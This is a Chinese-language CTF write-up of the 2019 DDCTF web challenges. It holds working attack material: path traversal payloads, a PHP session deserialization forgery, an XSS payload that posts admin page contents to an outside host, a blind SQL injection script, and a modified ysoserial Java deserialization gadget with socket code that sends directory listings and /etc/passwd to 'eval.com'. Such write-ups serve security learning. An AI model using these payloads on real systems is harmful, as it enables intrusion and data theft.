---
title: 2019DDCTF  writeup
comments: true
date: 2019-04-19 11:04:00
tags:
	- writeup
	- web
	- misc
categories:
	- 信息安全
	- writeup
keywords:
	- ddctf
	- writeup
---

> 本文首发先知社区，文章链接：https://xz.aliyun.com/t/4862

最近打了打DDCTF，本来是无聊打算水一波。最后竟然做high了，硬肛了几天..
以下为本次比赛web题目的WriteUp:

<!-- more -->

### [100pt] 滴~

看到url疑似base64，尝试解密后发现加密规则如下。

```
b64(b64(ascii2hex(filename)))
```

于是可以自己构造，使其实现任意文件读取，首先先尝试/etc/passwd。

```
[plain] -> ../../../../../../../etc/passwd
[0] HEX -> 2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F2E2E2F6574632F706173737764
[1] base64 -> MkUyRTJGMkUyRTJGMkUyRTJGMkUyRTJGMkUyRTJGMkUyRTJGMkUyRTJGNjU3NDYzMkY3MDYxNzM3Mzc3NjQ=
[2] base64 -> TWtVeVJUSkdNa1V5UlRKR01rVXlSVEpHTWtVeVJUSkdNa1V5UlRKR01rVXlSVEpHTWtVeVJUSkdOalUzTkRZek1rWTNNRFl4TnpNM016YzNOalE9
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50947ba0-6202-1.png)

发现斜杠被过滤掉了。此时尝试读一下index.php源码。来看一下规则。

```
[plain] -> index.php
[2] base64 -> TmprMlJUWTBOalUzT0RKRk56QTJPRGN3
```

最终获取到源码如下。

![](https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50be2e82-6202-1.png)

在这里，可以看到对对文件读取做了限制，想绕正则，是不存在的。此时打开预留hint看看，猜测可能是echo的问题？试了许久，还是放弃了。

过了几天，默默打开CSDN评论，还是看到一点有意思的东西的。最终发现出题人故意将hint放在practice.txt.swp

emm，贼迷的一题。然后提示flag!ddctf.php

![20190418155555180974149.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50cac2c8-6202-1.png)

读源码，此时用config替代！号：

```
~/D/D/web-di~ $ python a.py f1agconfigddctf.php
[0] HEX -> 66316167636F6E66696764646374662E706870
[1] base64 ->NjYzMTYxNjc2MzZGNkU2NjY5Njc2NDY0NjM3NDY2MkU3MDY4NzA=
[2] base64 ->TmpZek1UWXhOamMyTXpaR05rVTJOalk1TmpjMk5EWTBOak0zTkRZMk1rVTNNRFk0TnpBPQ==
```

![20190418155555207812339.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014929-50e49324-6202-1.png)


然后直接构造就好了

```
url: http://117.51.150.246/f1ag!ddctf.php
get: ?uid=123&k=php://input
post: 123
```


![20190418155555220658207.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-51054d8a-6202-1.png)





### [130pt] 签到题

很简单的一个代码审计题目。一开始有点脑洞，需要绕一下认证，不过也不难。

访问页面，会有一个登陆认证，此时分析流量数据，可以发现他向auth.php请求了一下，返回值刚好是没权限。也就是权限验证在这里，分析数据包，可以发现，请求头有一个username字段。尝试修改为admin，此时成功通过认证。

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-5124034c-6202-1.png)



然后返回了一个源码页面。此时进入分析源码阶段。源码不是太多，核心逻辑也很好懂，包括利用链的构造。

首先，分析源码，可以看到危险函数unserialize，以及file_get_contents。

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-513f8f40-6202-1.png)

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-5154291e-6202-1.png)

此时可以大概知道题目大体解题流程如下：

通过session反序列化 -->创建Application对象--> 控制path --> getfalg

此时一步一步来。

分析代码，可以发现session这个变量，是由cookie传入的。此时经过签名校验，确定cookie不可更改。代码如下：

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-516d3512-6202-1.png)

此时可以看到，签名规则是md5(eancrykey+session)，也就是说，我们要想获得cookie控制权，必须得到eancrykey。通读代码，分析eancrykey出现地点。最终发现两个可疑点

a) eancrykey存放目录为../config/key.txt。

由于不在web目录且没有读文件的漏洞，此时攻击者不可获取。

b) 某处代码存在蜜汁调用。

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014930-517bafde-6202-1.png)



很明显，可以看出是主办方给的后门，但是怎么用呢？

sprintf函数，是格式化字符串用的函数。可以参考c语言的printf，只不过这里不会打印，而是返回格式化后的字符串。

此时可以分析一下逻辑。

```python
# python 伪代码
# 别尝试执行，肯定执行不了

data="Welcome my friend %s"
arr=['eval','key']
for i in arr:
  data=sprintf(data,i)
  print(data)

# 输出如下：
# Welcome my friend eval
# Welcome my friend eval
```
此时问题来了，为什么会输出两次？因为在第一次格式化的时候，已经将eval填入data中，第二次格式化前的字符串为：Welcome my friend eval。此时没有%s占位，key也就无处可去了。

所以，此时我们将eval改成%s，遍可以成功打印出key。机智！

![20190416155534646782674.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014931-51b2449a-6202-1.png)

此时成功getkey。然后就可以愉快地伪造session了。

然后继续分析Application，我们该如何伪造session。此时，建议down下来Application.php，方便调试使用。


![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014931-51cdaece-6202-1.png)

可以发现，代码中做了两层防护，来保证path的安全性。此时sanitizepath可以通过一个最经典的绕过---“双写” 来进行绕过。

```
payload: ../
双写后: ..././
```
此时可以看出，在经过这个函数后，第二三四个字符将会被转为空。然后成功使../逃逸出来。

再看第二个限制了字符为18。此时我们可以通过../和./来进行绕过，不过，唯一缺点是，字符不能超过18个。

此时尝试读取/etc/passwd。计算其长度，为10。此时我们可以构造如下：

```
/etc/../etc/passwd
双写后:/etc/..././etc/passwd
序列化后:O:11:"Application":1:{s:4:"path";s:21:"/etc/..././etc/passwd";}
按规则签名后:O%3a11%3a"Application"%3a1%3a{s%3a4%3a"path"%3bs%3a21%3a"/etc/..././etc/passwd"%3b}75c51ff78b04d77138ca58f797dedc0a;
```


![20190418155552854552309.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014931-521160ec-6202-1.png)

此时可以看到成功读取了/etc/passwd。

最终在 ../config/flag.txt读到flag，如下：

![20190418155552881549035.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-524a5c1c-6202-1.png)





  


### [130pt] Upload-IMG

比较经典的一个题目了，绕过GD库，实现图片马。一般来说，搭配一个文件包含，简直是无敌的。在这里不多解释，直接上脚本了。

https://github.com/BlackFan/jpg_payload


> Usage: php jpg_payload.php <jpg_name.jpg>



![20190418155552900631607.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-525bbc82-6202-1.png)



### [140pt] homebrew event loop

这题给好评，思路超级棒！

先说一下题目：开局给你3块钱，让你买5个一元一个的钻石。从而得到flag。

上来可以拿到源码，首先分析源码。
```python
# flag获取函数
def FLAG()

# 以下三个函数负责对参数进行解析。
# 1. 添加log，并将参数加入队列
def trigger_event(event)

# 2. 工具函数，获取prefix与postfix之间的值
def get_mid_str(haystack, prefix, postfix=None):

# 3. 从队列中取出函数，并分析后，进行执行。（稍后进行详细分析）
def execute_event_loop()

# 网站入口点
def entry_point()

# 页面渲染，三个页面:index/shop/reset
def view_handler()

# 下载源码
def index_handler(args)

# 增加钻石
def buy_handler(args)

# 计算价钱，进行减钱
def consume_point_function(args)

# 输出flag
def show_flag_function(args)
def get_flag_handler(args)
```

源码大概意思如上，可以看出大概流程。然后仔细分析，可以发现在购买逻辑中。先调用增加钻石，再调用计算价钱的。也就是先货后款。

![20190413155516130320917.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-527b68b6-6202-1.png)


现实生活中，肯定没毛病，但是在计算机中，会不会出现先给了货后，无法扣款，然后货被拿跑了。此时继续往下看，发现consume_point_function函数中，当钱不够时，会抛出一个RollBackException。此时，在逻辑处理函数execute_event_loop中，会捕获这个异常，并将现有状态置为上一session状态。如下：

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-528ee7b0-6202-1.png)

此时，天真的我，想起了条件竞争，如果我够快的话，会不会让他加几个钻石，重置session时，重置到已经加完的。

但此时，仔细分析代码，以及flask的特性，你会发现一件事，他的状态并非是基于服务端session，而是客户端session，此时不应该叫他session了，叫cookie更合适一点。也就是，所有的状态都存在客户端。你竞争的话，他的session是单线程的。我必须操作完上一状态，才可以操作下一状态。

此时，条件竞争凉凉。

那既然状态是在客户端，那我可不可以修改？答案是可以。但是你得需要知道flask的secret_key。然后从而伪造cookie，此时我们无法伪造。思路继续断掉。继续分析代码。

仔细分析execute_event_loop，会发现里面有一个eval函数。无论在什么语言中，eval可控， 必定是一个灾难。

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014932-52b1bf06-6202-1.png)

此时 action使我们可控的，但是由于白名单过滤的存在，我们可控的范围较小。

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-52d17ca6-6202-1.png)

此时，我们可控点为eval前面对的action部分，于是后面的脏字符，我们可以通过#去注释掉。（p.s.用的时候请url编码为%23）

但是由于白名单限制，我们无法做一些操作。所以只能依靠其本身的作用 -- 动态执行函数。

此时action，即需要执行的函数名，args，执行函数的参数。这两个都在我们可控范围。

尝试构造如下payload：
```
?action:show_flag_function%23;123
```

此时，成功返回：

![20190413155516526743131.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-52ee491c-6202-1.png)

果然，我是最天真的那个崽。

但此时也证明了我们思路的可行性，此时我们只需要找一个函数，可以给其传一个参数的那种。进而getflag。

（p.s. flag函数无参数，所以我们无法直接执行。）

找啊找啊找朋友，一天过去了，又一天快要过去了... 代码都快会背了....

最终功夫不负有心人，终于发现一个神奇的地方。

![20190413155516540449537.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-53004d92-6202-1.png)


第144行，trigger_event函数中，他传入了两个功能。然后回想代码，可以发现前面对各个函数执行，是通过execute_event_loop来对队列里的任务进行执行的。trigger_event正是那个添加任务到队列中的函数，此时该函数我们可控。

再想到之前的条件竞争，我们可以在内部构造一个竞争？对的，可以的，但是此时不配称之为竞争了。

首先我们看一下我们购买的正常逻辑。


此时，由于其先进先出的原因，我们可以一开始就传入两个参数，如下：
```
?action:trigger_event%23;action:buy;111%23action:get_flag;
```
此时传入一个buy和getfalg。我们再看一下逻辑。这样成功实现了，没钱买东西。




此时，问题来了，即便我们够了5个钻石，此时也获取不到flag。

因为他将打印flag的语句注释掉了。

![2019041315551617756239.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-5323353c-6202-1.png)

可以看图片155行，此时return的为“天真的孩子”。那这样的话，是不是这题就没法解了？

肯定能解啊，怎么可能不能解。

此时仔细看165行，发现了什么？他是将flag作为参数传到show_flag的。别忘了，trigger_event是有log功能的，也就是此时flag会加进log里的。虽然log是在session中，但是，此时flask的特性，我们之前已经说过了。session是在本地的。虽然不能伪造，但是我们还是通过工具解开，查看内容的。

![20190413155516616949593.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014933-535036fe-6202-1.png)

![20190413155516621987237.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-536aa9bc-6202-1.png)

![20190413155516626378085.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-537ca694-6202-1.png)



### [200pt] 欢迎报名DDCTF
emm,感觉这题应该比吃鸡分高的。这道题，感觉比较偏实战渗透。不过作为ctf题目来说，的确有点脑洞了。因为大部分同学没往实战上想。

首先第一步：XSS

说实话，一开始拿到这题第一反应是注入。瞎注了半天。最后无疾而终。

知道hint出来，竟然是我最喜欢的xss，然后就做了。做到后面，已经拿到接口了，也尝试了注入，然而又没卵用。

第二步：注入

主办方不放hint是注入的话。这题我就不打算做了。实在get不到点。还是太菜了、

------以下正文------

xss读文件，很基础。发现waf了iframe和window。在es6新语法中，很好绕的。

```javascript
function s(e) {
  var t = new XMLHttpRequest;
  t.open("POST", "//eval:2017", !0),
  t.setRequestHeader("Content-type", "text/plain"),
  t.onreadystatechange = function() {
    4 == t.readyState && t.status
  },
  t.send(e);
};

var a = document.createElement("ifr"+"ame");


a.src = "./admin.php";

document.body.appendChild(a);
a.onload = function (){
  var c = document.getElementsByTagName("ifr"+"ame")[0]["contentWin"+"dow"].document.getElementsByTagName("body")[0].innerHTML;
  s("5am3: "+c);
};
a.onerror = function (){
    s("5am3 error!");
};
```


这里还有一个坑点是，渲染payload是在admin.php，此时如果读当前页面源码，返回的是你的payload。必须再次通过iframe读取admin.php，才能获取到本来的源码。

从源码中，可以得到一个接口：

```
http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=
```

这就是传说中的注入点！！！要不是主办方肯定他是，我都不敢信...

最后终于通过宽字节注入，试出了点眉目。

p.s.注入过程真心迷，不跑5遍以上脚本，读不出来正确的东西

```python
import requests

url = "http://117.51.147.2/Ze02pQYLf5gGNyMn//query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id={payload}"

sdb ="SELECT database()"
sdbt = "database()"

sschema = "SELECT group_concat(schema_name) from information_schema.SCHEMATA"
stable = "SELECT group_concat(table_name) from information_schema.tables where table_schema=CHAR(99,116,102,100,98)"
scolumn = "SELECT group_concat(column_name) from information_schema.columns where table_name=CHAR(99,116,102,95,102,104,109,72,82,80,76,53)"
sflag = "SELECT group_concat(ctf_value) from ctfdb.ctf_fhmHRPL5"
 

script = sflag
charIndex = 1

p1 = "1%df%27 || if(ascii(substr(("+script+"),{charIndex},1))={i},sleep(100),5)%23"
plendatabase = "1%df%27 || if(length(database())={i},sleep(100),5)%23"
ptest = "1%df%27 || sleep(5)%23"

# len(database) = 3
# database() = say

# schema = information_schema,ctfdb,say
# table = ctf_fhmHRPL5
# colum = ctf_value
# DDCTF{GqFzOt8PcoksRg66fEe4xVBQZwp3jWJS}

string = "qwertyuiopasdfghjklzxcvbnm"
str1=""

slist = range(33,97)
slist += range(123,127)
flag=""

onpayload = p1
# print slist
for j in range(1,50):
	for i in range(32,127):
		try:
			# i = str(hex(i))
			i = str(i)
			payload = onpayload.replace("{i}",i).replace("{charIndex}",str(j))	
			r = requests.get(url+payload,timeout=3)
			text = r.text.replace("\n","")
			text = text.replace("\r","")
			text = text.replace("\t","")
			# print("["+str(i)+"]" + payload)
			# print("[text] " + text[:10])
		except:
			flag+=chr(int(i))
			print(flag)
			break


```





### [210pt] 大吉大利，今晚吃鸡

很迷很尬的一道题，最后小手段才做出来。

首先，很容易可以看出来，是一个go写的。

而且买票时，票价只可以多 ，不可以少。此时可以猜到是溢出，从而实现购买。

可以看一下，go中的数字范围。然后天真的从大往小试。最终卡在了以下俩数。

```
9223372036854775807   // 可以输入，显示正常
9223372036854775808   // 报500，无法输入
```


![20190413155515397624591.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-53a0ab20-6202-1.png)

于是自己天真的认为 ，题目对溢出做了判断，然后就凉了。蜜汁分析了半天。

最后再注册处发现一个越权漏洞。每次注册，无论成功与否，都会返回注册用户的cookie，此时可以直接登录。

![20190413155515437376035.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-53c23aec-6202-1.png)

于是看了一下榜单，挨个试了一下榜单师傅们的id。

最后还真找到了rmb122师傅的账号，然后发现他用的4294967296溢出。也就是uint32

心态炸了。竟然不是uint64，自己也没试uint32。哭了。

此时通过溢出，可以直接购票。然后我们进入下一关，如何删除竞争对手。一说到游戏，顿时想起了“白导”。我自己也导演一场呗。

于是，新建账号 -> 买票 -> 付款 -> 加入游戏 -> 获取id踢掉。一条龙服务。脚本如下：

```python
import requests
import random
import time

tmpID = "1"

tmpSession = requests.session()

registerURL = "http://117.51.147.155:5050/ctf/api/register?name=5am3_t1{name}&password=12345678aa90"
buyTicketURL = "http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"
payTicketURL = "http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id={bill}"
removeRobotsURL = "http://117.51.147.155:5050/ctf/api/remove_robot?id={uid}&ticket={ticket}"

headers = {
	"Cookie": "REVEL_SESSION=367aac22fa4d096ee5e45e5e214071cf; user_name=5am3"
}

def getTicket(tmpID):
	tmpRegisterURL = registerURL.replace("{name}",tmpID)
	tmpSession.get(tmpRegisterURL)

	billID = tmpSession.get(buyTicketURL).json()["data"][0]["bill_id"]

	# print(billID)

	tmpPayTicketURL = payTicketURL.replace("{bill}",billID)
	# print(tmpPayTicketURL)
	ticketJson = tmpSession.get(tmpPayTicketURL).json()
	# print(ticketJson)
	ticket,uid = ticketJson["data"][0].values()

	return ticket,uid

if __name__ == '__main__':
	i = 1
	c = 0
	while(i<3 and c < 50):
		name = str(random.randint(1000, 90000))
		c+=1
		try:
			ticket,uid = getTicket(name)
			# print(ticket,uid)

			tmpRRURL = removeRobotsURL.replace("{uid}",str(uid)).replace("{ticket}",ticket)
			RRjson = requests.get(tmpRRURL,headers=headers).json()

			if(RRjson["data"]):
				print("["+str(i)+"] " + str(RRjson["data"]))
				print("")
				i+=1
			time.sleep(1)
			
		except:
			pass

```

![20190413155515676260248.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014934-53d3ce10-6202-1.png)





### [260pt] mysql弱口令

挺有意思的一道题，最后算是非预期出的吧。预期解实在是想不出来了。

首先拿到题目，其实就感觉是杭电那题了 [wp链接](https://www.yuque.com/sourcecode/2019hgame/happygo)

通过蜜罐sql客户端，来获取连接者的数据。但这题，说实话前期把我玩蒙了。

题目逻辑，首先下载扫描验证端，放到服务器上，做一下信息收集。然后再服务端填写自己服务器信息，就可以开始弱口令扫描了。

天真的我以为端口是填agent的端口。酿成一大惨祸。最后才发现，端口是填数据库端口。这样一来，心结解开。终于能拿数据了。

拿数据的心路历程更加艰难险阻。首先肯定是先读/etc/passwd。进而直接尝试读/flag，发现没有。

此时，自己意识到了事情的不简单。这是要和flag玩捉迷藏么。

这是很难受的一件事...

p.s.心酸历程就不说了。读文件肯定没这么顺利，要都说的话，1万字也收不住。

按照杭电那次学到的妙招，首先可以先读一下/proc/self/environ,如下图。

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014935-54038c18-6202-1.png)

此时可以发现两个点，第9行和11行，组合起来/home/dc2-user/ctf_web_2/restart.sh。此时读取发现如下信息

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014935-5412aa40-6202-1.png)

从中，我们可以分析出来，该应用为flask应用，用gunicorn中间件起来的。

此时根据规则 gunicorn 文件名:项目名。可以推出：
> /home/dc2-user/ctf_web_2/didi_ctf_web2.py


尝试读取，可以发现：

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014935-544327ec-6202-1.png)

此时证实了我们的猜想。然后根据flask_script项目的目录结构，进而读取app。

然后一环接一环，依次读出了下面三个。

> /home/dc2-user/ctf_web_2/app/__init__.py
> /home/dc2-user/ctf_web_2/app/main/__init__.py
> /home/dc2-user/ctf_web_2/app/main/views.py


在main/views.py中，我们可以看到一个hint。

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014935-545ac654-6202-1.png)

猜测是通过curl可以从数据库中读到flag...

奈何自己比较菜，看到数据库遍想起来好像有个文件，是在手动修改数据库时，会留log。

对，没错，就是.mysql_history。此时尝试用户目录，root目录，最终在root目录读到flag
> /root/.mysql_history

![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-54b3473e-6202-1.png)




### [390pt] 再来1杯Java

p.s.压轴题哈，说实话，这题真的学会了不少东西。毕竟自己太菜了，虽然本科专业为java开发狗。但我真的不太熟啊...

一共分为三关吧。

首先是一个PadOracle攻击，伪造cookie。这个解密Cookie可以看到hint： PadOracle:iv/cbc。

第二关，读文件，看到后端代码后，才发现，这里贼坑。

第三关，反序列化。

首先第一关好说，其实在/api/account_info这个接口，就可以拿到返回的明文信息。然后通过Padding Oracle + cbc翻转来伪造cookie即可。在这里就不多说了。网上很多资料。

最后拿到cookie，直接浏览器写入cookie就OK。然后可以获取到一个下载文件的接口。
> /api/fileDownload?fileName=1.txt

虽然说是一个任意文件读取的接口，但是贼坑、

一顿操作猛如虎，最后只读出/etc/passwd...

搜到了[很多字典](https://github.com/tdifg/payloads/blob/master/lfi.txt)。然后burp爆破一波，最后发现/proc/self/fd/15这里有东西，看到熟悉的pk头，情不自禁的笑了起来。（对，就是源码）

![20190419155560741062781.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-54f65eac-6202-1.png)



源码也不多，很容易，可以看到一个反序列化的接口。

![20190418155560268113326.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-5527d2de-6202-1.png)

在反序列化之前，还调用了SerialKiller，作为一个waf，对常见payload进行拦截。

首先题目给了hint：JRMP。根据这个hint，我们可以找到很多资料。在这里自己用的ysoserial，根据他的JRMP模块来进行下一步操作。

在这里，JRMP主要起了一个绕过waf的功能，因为这个waf只在反序列化userinfo时进行了调用。当通过JRMP来读取payload进行反序列化时，不会走waf。

首先，JRMP这个payload被waf掉了，我们可以采用先知上的一种绕过方式。

> [https://xz.aliyun.com/t/2479](https://xz.aliyun.com/t/2479)

![20190418155560308363179.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014937-5555b226-6202-1.png)

直接修改ysoserial源码即可，将原有的JRMPClient的payload复制一份，改名为JRMPClient2，然后保存并编译。

此时我们可以尝试使用URLDNS模块，来判断是否攻击成功。

```bash
# 修改替换{{内容}}

# 开启监听端口
# 建议采用ceye的dnslog查看
java -cp ./ysoserial-5am3.jar ysoserial.exploit.JRMPListener {{port}} URLDNS {{http://eval.com}}


# 生成链接JRMPListener的payload
# ip端口那里填写运行第4行脚本的主机地址端口
java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8119}} | base64

# 此时将第10行生成的代码，直接打到远程即可。
```
然后查看dnslog信息。发现存在，那就是ok了。


接下来可以尝试换payload了。此时这里还存在一个问题。服务器端无法执行命令！！

这个是hint中给的，所以我们需要找另一种方式，如：代码执行。

查阅资料，发现ysoserial预留了这块的接口，修改即可。

> [https://blog.csdn.net/fnmsd/article/details/79534877](https://blog.csdn.net/fnmsd/article/details/79534877)


然后我们尝试去修改ysoserial/payloads/util/Gadgets.java中createTemplatesImpl方法如下：

```java
// createTemplatesImpl修改版，支持代码执行
public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
//        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
//            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
//            "\");";
        String cmd="";
        //如果以code:开头，认为是代码，否则认为是命令
        if(!command.startsWith("code:")){
            cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
            "\");";
        }
        else{
            System.err.println("Java Code Mode:"+command.substring(5));//使用stderr输出，防止影响payload的输出
            cmd = command.substring(5);
        }
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }
```

此时，我们的payload已经可以支持代码执行了。

在这里，我是直接用本地的题目环境进行调试，尝试打印了aaa,操作如下。

```bash
# 修改替换{{内容}}

# 开启监听端口
# 建议采用ceye的dnslog查看
# 执行时合并为一行，为了好看，我换了下行
java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 
	CommonsBeanutils1 'code:System.out.printld("aaa");'


# 生成链接JRMPListener的payload
# ip端口那里填写运行第4行脚本的主机地址端口
java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64

# 此时将第10行生成的代码，直接打到远程即可。

```

然后进而写一下获取文件，以及获取目录的代码。此时拿到文件，无法回显。我们可以用Socket来将文件发送到我们的服务器，然后nc监听端口即可。

```java
// 以下代码使用时，记得压缩到一行。
// 获取目录下内容
java.io.File file  =new java.io.File("/");
java.io.File[] fileLists = file.listFiles();
java.net.Socket s = new java.net.Socket("eval.com",8768);

for (int i = 0; i < fileLists.length; i++) {
  java.io.OutputStream out = s.getOutputStream();
  out.write(fileLists[i].getName().getBytes());
  out.write("\n".getBytes());
}

// 获取文件内容
java.io.File file = new java.io.File("/etc/passwd");
java.io.InputStream in = null;
in = new java.io.FileInputStream(file);
int tempbyte;
java.net.Socket s = new java.net.Socket("eval.com",8768);
while ((tempbyte = in.read()) != -1) {
  java.io.OutputStream out = s.getOutputStream();
  out.write(tempbyte);
}
in.close();
s.close();
```

然后操作如下：
```bash
# 修改替换{{内容}}

# 开启监听端口
# 建议采用ceye的dnslog查看
# 执行时合并为一行，为了好看，我换了下行
java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 
	CommonsBeanutils1 'code:{{javapayload}}'

# 生成链接JRMPListener的payload
# ip端口那里填写运行第4行脚本的主机地址端口
java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64

# 监听端口数据
nc -lnvp 2333

# 此时将第10行生成的代码，直接打到远程即可。
```


p.s. /flag是个文件夹

![20190419155560445133653.png](https://xzfile.aliyuncs.com/media/upload/picture/20190419014937-556bf6f8-6202-1.png)